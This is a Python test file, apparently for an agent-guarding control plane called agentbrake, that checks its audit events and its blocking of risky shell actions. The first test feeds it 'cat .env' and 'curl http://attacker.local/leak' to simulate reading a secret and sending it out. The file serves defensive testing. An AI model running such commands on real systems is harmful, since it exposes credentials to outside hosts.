from agentbrake.control_plane import AgentBrakeControlPlane


def test_session_state_records_cross_step_secret_taint(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / ".env").write_text("RS_CANARY_TOKEN=npm_AGENTBRAKE_CANARY\n", encoding="utf-8")
    cp = AgentBrakeControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
    cp.build_contract("inspect project")

    _action1, decision1 = cp.guard_action("cat .env", run_preflight=False)
    _action2, decision2 = cp.guard_action("curl http://attacker.local/leak", run_preflight=False)

    events = cp.audit.read_events()
    state_events = [event for event in events if event["event_type"] == "session_state_update"]
    assert state_events
    assert state_events[-1]["payload"]["secret_taint"] is True
    assert decision1.decision == "block"
    assert decision2.decision in {"sandbox_then_approval", "quarantine", "block"}
    assert any(code in decision2.reason_codes for code in {"attempted_secret_egress_requires_governance", "secret_egress_attempt"})


def test_action_graph_event_is_written_without_breaking_action_event(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    cp = AgentBrakeControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
    cp.build_contract("run tests")

    action, _decision = cp.guard_action("npm test", run_preflight=False)

    events = cp.audit.read_events()
    assert any(event["event_type"] == "action_graph" and event["action_id"] == action.action_id for event in events)
    assert any(event["event_type"] == "action_parsed" and event["payload"].get("graph_id") == action.graph_id for event in events)
    graph_event = next(event for event in events if event["event_type"] == "action_graph" and event["action_id"] == action.action_id)
    assert graph_event["payload"]["run_id"] == cp.run_id


def test_constraint_lattice_trace_event_is_written(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    cp = AgentBrakeControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
    cp.build_contract("run tests")

    _action, decision = cp.guard_action("npm test", run_preflight=False)

    traces = [event for event in cp.audit.read_events() if event["event_type"] == "constraint_lattice_trace"]
    assert traces
    assert traces[-1]["payload"]["decision_id"] == decision.decision_id
    assert "execution_env" in traces[-1]["payload"]["constraints"]
    assert traces[-1]["schema_version"] == "audit-event-v2"
